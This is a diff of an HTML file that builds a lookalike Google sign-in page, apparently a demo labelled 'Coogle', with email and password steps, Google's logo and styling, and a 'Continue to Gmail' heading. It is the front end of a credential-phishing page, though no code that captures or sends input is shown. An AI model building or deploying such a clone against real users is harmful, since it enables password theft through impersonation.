@@ -1,8 +1,20 @@
+
+<!--
+    Snazzy new google login input!
+                                                 <label class="pure-material-textfield-outlined">
+                                                    <input placeholder=" ">
+                                                    <span>Enter your password</span>
+                                                  </label>
+
+
+-->
+
+<!-- ''"COOGLE FAKE GOOGLE LOGIN PAGE"'' -->
 <!DOCTYPE html>
 <html lang="en" dir="ltr">
     <head>
         <meta charset="utf-8">
-        <title>Google</title>
+        <title>Coogle</title>
         <!-- JQuery and Bootstrap -->
 
         <script src='https://code.jquery.com/jquery-3.4.1.min.js'></script>
@@ -10,10 +22,12 @@
         <link href='https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css' rel="stylesheet">
         <script src='https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js'></script>
         <link href='assets/css/progress-bar.css' rel="stylesheet">
+        <link href='assets/css/material-input.css' rel="stylesheet">
 
         <link rel="stylesheet" href="assets/css/custom.css">
         <script src='assets/js/custom.js'></script>
 
+        <link href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,300;0,400;0,600;0,700;0,800;1,300;1,400;1,600;1,800&display=swap" rel="stylesheet">
         <!-- Set the favicon -->
         <link rel="icon" type="image/png" href="assets/images/favicon.ico">
 
@@ -28,11 +42,8 @@
           font-weight: normal;
         }
 
-        @font-face {
-          font-family: 'open-sans';
-          src: URL('assets/fonts/OpenSans-Regular.ttf') format('truetype');
-          font-weight: normal;
-        }
+
+
 
         </style>
     </head>
@@ -41,7 +52,7 @@
             <div class="login-container">
                 <!-- progress bar from material.io -->
                 <div class='progress-bar-container show-progress'>
-                    <div class="progress-bar mdc-linear-progress mdc-linear-progress--indeterminate progress-hidden" style='display:none;'>
+                    <div class="progress-bar mdc-linear-progress mdc-linear-progress--indeterminate progress-hidden" style='display:none;' id='cgle-progress-bar'>
                         <div class="mdc-linear-progress mdc-linear-progress--indeterminate">
                             <div class="mdc-linear-progress__buffering-dots"></div>
                             <div class="mdc-linear-progress__buffer"></div>
@@ -51,7 +62,7 @@
                     </div>
                 </div>
                 <div class='login-content' id='login-form'>
-                    <!-- Google Logo -->
+                    <!-- Google Logo ''"COOGLE FAKE GOOGLE LOGIN PAGE"'' -->
                     <div id="logo" title="Google">
                     <svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
                         <g id="qaEJec">
@@ -75,33 +86,133 @@
                     </svg>
                     <!-- /Google Logo -->
                     </div>
-                    <form id='email-form-step'>
-                        <h1 class='g-h1'>Sign in</h1>
-                        <h2 class='g-h2'>to continue to The Cloud</h2>
-                        <div class='login-content'>
-                            <input id='email-input' type="text" class='g-input' placeholder="Email or phone">
-                            <div class="invalid-email" style='display:none;'>
-                                <!-- SVG for the invalid icon -->
-                                <span class="invalid-icon">
-                                    <svg fill="#d93025" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
-                                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path>
-                                    </svg>
-                                </span><span class='invalid-email-text-span'>Enter a valid email or phone number</span>
-                            </div>
-                            <legend class='g-legend'>Forgot email?</legend>
-                            <div class='login-priv'>
-                                <p class='p'>Not your computer? Use Guest mode to sign in privately.</p>
-                                <legend class='g-legend'>Learn more</legend>
-                            </div>
-                            <!-- form navigation menu -->
-                            <div class='login-nav'>
-                                <legend class='g-legend'>Create Account</legend>
-                                <div class='gbtn-primary btn-next-email'><span class='gbtn-label'>Next</span></div>
-                            </div>
+                    <h1 class='g-h1' id='instruction-text'>Sign in</h1>
+                    <h2 class='g-h2' id='instrution-text-desc'>Continue to Gmail</h2>
+                        <div >
+                            
+
+                                    <style>
+
+                                       .slide-container-outer {
+                                            width: 100%;
+                                           min-height: 50px;
+                                           position: relative;
+                                           overflow-x: hidden;
+                                       }
+
+                                       .slide-container {
+                                            position: relative; /* absolute; */                                                                                 /*   ''"COOGLE FAKE GOOGLE LOGIN PAGE"'' */
+                                            width: 200%;
+                                            display: flex;
+                                       }
+
+                                       .slide-item {
+                                           min-height: 50px;
+                                           width: 50%;
+                                           position: relative;
+                                       }
+                                        
+
+                                       .g-email-preview {
+                                            border-radius: 16px;
+                                            border: 1px solid #dadce0;
+                                            display: table;
+                                            margin: 0 auto;
+                                            padding: 3px;
+                                            margin: 0 auto;
+                                            margin-bottom: 55px;
+                                       }
+
+                                       .qQWzTd {
+                                            margin-right: 8px;
+                                            margin-left: 3px;
+                                       }
+                                       .krLnGe {
+                                           margin-left: 4px;
+                                       }
+
+                                       .dsxx49 {
+                                        font-size: 14px;
+                                        margin-top: 2px;
+                                       }
+                                    </style>
+
+                                    <div class='slide-container-outer'>
+                                        <div class='slide-container'>
+                                            <div class='slide-item' id='slide-password'>
+                                                
+                                                
+
+
+                                                    <div class='g-email-preview'>
+                                                        
+                                                        <div style='display:flex'>
+
+                                                            <div class="qQWzTd" aria-hidden="true"><svg aria-hidden="true" class="stUf5b" fill="currentColor" focusable="false" width="20px" height="20px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"></path></svg></div>
+
+                                                            <div class="dsxx49" id='prev-email'>couldbejake@gmail.com</div>
+                                                        
+                                                            <div class="krLnGe"><svg aria-hidden="true" class="stUf5b MSBt4d" fill="currentColor" focusable="false" width="18px" height="18px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><polygon points="12,16.41 5.29,9.71 6.71,8.29 12,13.59 17.29,8.29 18.71,9.71"></polygon></svg></div>
+                                                        
+
+                                                        </div>
+                                                    </div>
+
+                                                    <form id='password-form-step'>
+                                                        <div class='g-input'>
+                                                                <input id='password-input' type="password" placeholder="Enter your password">
+                                                        </div>
+                                                    </form>
+
+                                                    <div class='login-nav'>
+                                                        <legend class='g-legend'>Forgot Password</legend>
+                                                        <div class='gbtn-primary btn-next-password'><span class='gbtn-label'>Next</span></div>
+                                                    </div>
+
+
+
+                                            </div>
+                                            <div class='slide-item' id='slide-username'>
+                                                
+                                                <form id='email-form-step'>
+                                                    <div class='g-input'>
+                                                        <input id='email-input' type="text"  placeholder="Email or phone">
+                                                    </div>
+                                                </form>
+
+                                                <div class="invalid-email" style='display:none;'>
+                                                    
+                                                    <span class="invalid-icon">
+                                                        <svg fill="#d93025" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
+                                                            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path>
+                                                        </svg>
+                                                    </span><span class='invalid-email-text-span'>Enter a valid email or phone number</span>
+                                                </div>
+                                                <legend class='g-legend'>Forgot email?</legend>
+                                                <br>
+                                                <div class='login-priv'>
+                                                    <p class='p'>Not your computer? Use Guest mode to sign in privately.</p>
+                                                    <legend class='g-legend'>Learn more</legend>
+                                                </div>
+                                               
+                                                <div class='login-nav'>
+                                                    <legend class='g-legend'>Create Account</legend>
+                                                    <div class='gbtn-primary btn-next-email'><span class='gbtn-label'>Next</span></div>
+                                                </div>
+
+                                            </div>
+                                        </div>
+                                    </div>
+
+
                         </div>
-                    </form>
+
+
+                    
                 </div>
+                <img src="./assets/images/add-on.png" alt="Google" style='max-width:100%;'>
             </div>
+           
         </div>
     </body>
 </html>
